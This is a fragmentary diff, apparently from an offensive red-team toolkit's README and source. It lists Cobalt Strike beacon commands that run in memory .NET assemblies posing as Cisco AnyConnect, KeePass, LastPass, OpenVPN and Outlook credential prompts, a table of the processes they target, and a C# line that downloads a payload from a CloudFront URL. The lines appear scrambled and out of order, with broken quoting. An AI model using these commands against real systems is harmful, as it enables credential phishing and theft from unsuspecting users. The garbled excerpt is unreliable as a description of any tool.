@@ -1,0 +1,13 @@
+"            Console.WriteLine(""Usage: wpfRunner.exe"
+"        string remoteUrl = ""http://xxx.cloudfront.net/Outlook.exe"
+beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\CiscoAnyConnect.exe
+beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\KeePass.exe
+beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\LastPass.exe
+beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\OpenVPN.exe
+beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\wpfRunner.exe
+lliamknows/BOF.NET). I've inlcuded a simple C# script (wpfRunner.cs) for downloading the WPF Outlook.exe
+| Cisco AnyConnect     | vpnui.exe/vpnagent.exe
+| KeePass              | KeePass.exe
+| LastPass              | lpwinmetro.exe
+| OpenVPN                      | openvpn.exe
+| Windows Security (Outlook)   | OUTLOOK.exe/olk.exe
